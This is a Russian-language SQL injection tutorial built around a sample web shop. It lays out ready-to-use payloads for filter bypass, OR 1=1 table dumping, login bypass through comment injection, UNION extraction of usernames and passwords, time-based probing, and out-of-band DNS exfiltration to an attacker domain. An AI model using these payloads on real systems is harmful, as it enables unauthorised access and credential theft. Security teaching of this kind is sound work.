# ─── ⚡ 04_COMMON_VULNERABILITIES / РАСПРОСТРАНЕННЫЕ ВЕКТОРЫ SQLi ───

*(!) Важно отметить, что у каждой СУБД есть свой уникальный синтаксис. Все критически важные архитектурные отличия подробно описаны в модулях [01_Theory_DB](./01_Theory_DB.md) и [03_Resources_and_Cheatsheets](./03_Resources_and_Cheatsheets.md).*

Существует множество разновидностей уязвимостей SQL-инъекций, атак и техник, которые возникают в различных ситуациях в зависимости от логики приложения и конфигурации бэкенда.

### 📋 ОСНОВНЫЕ КЛАССЫ SQLi АТАК:
* **Получение скрытых данных (`05_Data_Exfiltration`)** — Изменение SQL-запроса для принудительного возврата дополнительных результатов, скрытых от обычного пользователя.
* **Подрыв логики приложения (`06_Logic_and_Auth_Bypass`)** — Вмешательство в заложенную разработчиком бизнес-логику (например, обход процесса авторизации).
* **UNION-based атаки (`07_Union_Based_Attacks`)** — Извлечение конфиденциальной информации из сторонних таблиц базы данных с помощью оператора объединения.
* **Blind SQLi (`08_Blind_SQLi`)** — Скрытый тип уязвимости, при котором результаты внедренного запроса или подробные ошибки СУБД вообще не возвращаются в HTTP-ответах приложения.

## 🟢 05_DATA_EXFILTRATION / ПОЛУЧЕНИЕ СКРЫТЫХ ДАННЫХ

Допустим, существует интернет-магазин, который отображает товары по категориям. Когда пользователь нажимает на категорию **Подарки**, браузер запрашивает URL: 
`https://shop.com/products?category=Gifts`

В ответ на это бэкенд выполняет сырой SQL-запрос для извлечения целевых позиций из базы данных:
```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
🔍 РАЗБОР ОРИГИНАЛЬНОГО ЗАПРОСА:
SELECT * — Выбрать все доступные столбцы (символ * в SQL означает ALL).

FROM products — Направление запроса к таблице products.

WHERE category = 'Gifts' AND released = 1 — Выборка строк, где категория строго равна 'Gifts' AND флаг released равен 1 (булево условие TRUE, означающее, что товар активен и выпущен в продажу).

⚔️ ВЕКТОР ЭКСПЛУАТАЦИИ #1 (Снятие ограничений)
Приложение полностью доверяет вводу пользователя. Атакующий может внедрить пейлоад прямо в URL-параметр:
https://shop.com/products?category=Gifts'--+

Gifts' — одинарная кавычка принудительно закрывает строковый литерал параметра category в коде разработчика.

--+ — символ комментария в SQL (знак + в URL заменяет пробел, который синтаксически необходим после дефисов). Все, что идет после него, база игнорирует.

Запрос на бэкенде трансформируется в:

SQL
SELECT * FROM products WHERE category = 'Gifts'--+' AND released = 1
Условие проверки AND released = 1 отсекается. База данных возвращает абсолютно все товары из категории Gifts, включая скрытые администратором позиции, которые еще не поступили в продажу.

⚔️ ВЕКТОР ЭКСПЛУАТАЦИИ #2 (Слив всей таблицы)
Вызов отображения вообще всех существующих продуктов из всех категорий сразу, включая те, о которых атакующий даже не знает:
https://shop.com/products?category=Gifts'+OR+1=1--+

Запрос принимает вид:

SQL
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--+' AND released = 1
Так как логическое тождество 1=1 истинно всегда (TRUE), условие WHERE отрабатывает как истина для каждой строчки в таблице products. База данных сливает весь свой контент на страницу.

⚠️ [CRITICAL_WARNING] : Нужно быть предельно осторожным при внедрении условий типа OR 1=1. Если этот пейлоад долетит до внутренних операторов UPDATE или DELETE, условие OR 1=1 заставит базу обновить или полностью уничтожить все данные в целевой таблице.

🟢 06_LOGIC_AND_AUTH_BYPASS / ПОДРЫВ ЛОГИКИ ПРИЛОЖЕНИЯ
Допустим, веб-приложение реализует форму входа по логину и паролю. При отправке валидных данных (логин dolbaeb123 и пароль ProMenia), бэкенд проверяет их наличие в БД:

SQL
SELECT * FROM users WHERE username = 'dolbaeb123' AND password = 'ProMenia'
Если запрос возвращает валидную строку пользователя — вход выполнен успешно.

⚔️ ВЕКТОР ЭКСПЛУАТАЦИИ (Auth Bypass)
Атакующий может авторизоваться под учетной записью любого пользователя (например, целевого юзера liquidgenius), вообще не зная его пароля, просто удалив проверку пароля из конструкции WHERE.

В поле ввода username отправляется пейлоад: liquidgenius'--+, а поле password оставляется пустым.

Запрос трансформируется в:

SQL
SELECT * FROM users WHERE username = 'liquidgenius'--+' AND password = ''
СУБД спотыкается о комментарий и физически обрабатывает только укороченную версию запроса:

SQL
SELECT * FROM users WHERE username = 'liquidgenius'
База находит в таблице юзера liquidgenius, возвращает его профиль бэкенду, и приложение успешно авторизует атакующего, полностью проигнорировав пустой пароль.

🟢 07_UNION_BASED_ATTACKS / UNION-АТАКИ
Если результаты оригинального запроса выводятся прямо в HTTP-ответе приложения, оператор UNION позволяет склеить дефолтный запрос с нашим кастомным. Это дает возможность стянуть конфиденциальные данные из любых других доступных таблиц БД.

SQL
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
Этот запрос вернет один объединенный набор результатов со столбцами из обеих таблиц.

🛡️ ДВА ЖЕЛЕЗНЫХ ТРЕБОВАНИЯ ДЛЯ UNION-АТАКИ:
Внедряемый запрос должен возвращать точно такое же количество столбцов, что и исходный.

Типы данных в соответствующих столбцах должны быть полностью совместимы между собой.

🕹️ Шаг 1: Определение количества столбцов
Метод 1 (Инкремент ORDER BY): Внедряем серию выражений сортировки, увеличивая индекс столбца, пока сайт не упадет:
https://shop.com/filter?category=Gifts'+ORDER+BY+1--+
https://shop.com/filter?category=Gifts'+ORDER+BY+2--+
https://shop.com/filter?category=Gifts'+ORDER+BY+3--+ -> Ошибка: The ORDER BY position number 3 is out of range...
Раз на цифре 3 база упала, значит исходный запрос возвращает ровно 2 столбца.

Метод 2 (Подбор через UNION SELECT NULL): Отправляем серию NULL значений, так как тип NULL совместим со всеми типами данных в СУБД:
'+UNION+SELECT+NULL--+ (ошибка)
'+UNION+SELECT+NULL,NULL--+ (успешный ответ)
Если количество не совпадает, прилетает ошибка: All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.

🕹️ Шаг 2: Поиск столбцов со строковым типом данных (VARCHAR/TEXT)
Интересующая нас инфа (пароли, токены) обычно хранится в виде строк. Поочередно подставляем тестовый символ вместо NULL, прощупывая совместимость:

'+UNION+SELECT+'a',+NULL--+ — если падает с ошибкой Conversion failed when converting the varchar value 'a' to data type int, первый столбец принимает только числа.

'+UNION+SELECT+NULL,+'a'--+ — если текст 'a' отобразился на странице, второй столбец строковый. Его мы и юзаем.

🕹️ Шаг 3: Извлечение секретных данных
Зная, что у нас есть 2 столбца и оба текстовые, стягиваем данные из таблицы users (зная имена нужных столбцов username и password):

Plaintext
🔗 Боевой пейлоад: '+UNION+SELECT+username,+password+FROM+users--+
🔀 Экстракция нескольких значений в один столбец (Конкатенация)
Если строковый столбец всего один, а вытащить нужно оба значения сразу, мы склеиваем их через разделитель (например, тильду ~), чтобы данные не слиплись в кашу:

PostgreSQL / Oracle / SQLite: '+UNION+SELECT+username+||+'~'+||+password+FROM+users--+

MySQL: '+UNION+SELECT+CONCAT(username,+'~',+password)+FROM+users--+

🟢 08_BLIND_SQLI / СЛЕПЫЕ УЯЗВИМОСТИ
Когда веб-приложение не выводит результаты SQL-запросов и не показывает ошибки базы данных в своих HTTP-ответах, уязвимость является слепой. Данные все равно можно извлечь, используя более сложные подходы:

Boolean-based (Условные ответы): Изменение логики исходного запроса для вызова обнаружимой разницы в поведении приложения. Контент страницы меняется, пропадает или выдает внутреннюю ошибку (например, деление на ноль) в зависимости от того, истинно наше внедренное логическое условие или ложно.

Time-based (Временные задержки): Вызов принудительной паузы при обработке запроса на сервере (например, выполнение тяжелой функции или инжекция SLEEP(5)). Если сервер задерживает ответ ровно на 5 секунд — проверяемый символ/условие валидно.

Out-of-band (Внеполосные OAST техники): Метод, при котором мы заставляем саму базу данных инициировать сетевое взаимодействие с нашим подконтрольным сервером. Самый мощный вариант — прямая инжекция данных через поддомены в DNS-запросах (например, отправка DNS-запроса на password_admin.attacker.com).
